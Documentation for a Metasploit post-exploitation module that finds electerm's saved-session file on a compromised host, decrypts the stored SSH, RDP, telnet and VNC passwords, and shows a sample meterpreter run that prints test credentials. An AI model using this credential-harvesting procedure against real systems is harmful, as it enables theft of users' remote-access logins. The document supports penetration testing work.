## Vulnerable Application
  electerm is free and open source Terminal/ssh/telnet/serialport/RDP/VNC/sftp client.

  This module will determine if electerm is installed on the target system and, if it is, it will try to
  dump all saved session information from the target. The passwords for these saved sessions will then be decrypted
  where possible.

  Any electerm version on any operating system are supported.

  If it works normally, the connection name, host, username and password saved in the certificate file will be printed

### Installation Steps

  1. Download and run the electerm installer (https://github.com/electerm/electerm/).
  2. Select default installation
  3. Open the software and create a connection
     complete password setting, add the test account password to the certificate.

## Verification Steps

  1. Get a session.
  2. Do: `set session <session number>`
  3. Do: `run post/multi/gather/credentials/electerm`
  4. If the system has saved passwords, they will be printed out.

## Options

### BOOKMARKS_FILE_PATH

Specifies the `electerm.bookmarks.nedb` file path for electerm. (eg.
`C:\Users\FireEye\AppData\Roaming\electerm\users\default_user\electerm.bookmarks.nedb`).

## Scenarios

```
meterpreter > run post/windows/gather/credentials/electerm

[*] Gather electerm Passwords
[*] Looking for JSON files in /home/kali-team/.config/electerm/users/default_user/electerm.bookmarks.nedb
[+] electerm electerm.bookmarks.nedb saved to /home/kali-team/.msf4/loot/20240816195518_default_127.0.0.1_electerm.creds_806863.txt
[*] Finished processing /home/kali-team/.config/electerm/users/default_user/electerm.bookmarks.nedb
[+] Passwords stored in: /home/kali-team/.msf4/loot/20240816195518_default_127.0.0.1_host.electerm_421975.txt
[+] electerm Password
=================

Title   Type    Host       Port  Username  Password       Description
-----   ----    ----       ----  --------  --------       -----------
                127.0.0.1  22    ssh       asdasdawdasdw
                127.0.0.1  22    asdas     asdasdas
drp     rdp     127.0.0.1  3389  drp       drppass        rdp test
telnet  telnet  127.0.0.1  23    root      guest          telnet des
vnc     vnc     127.0.0.1  5900  vncuser   vncpass        vnc des
[*] Post module execution completed
meterpreter >
```
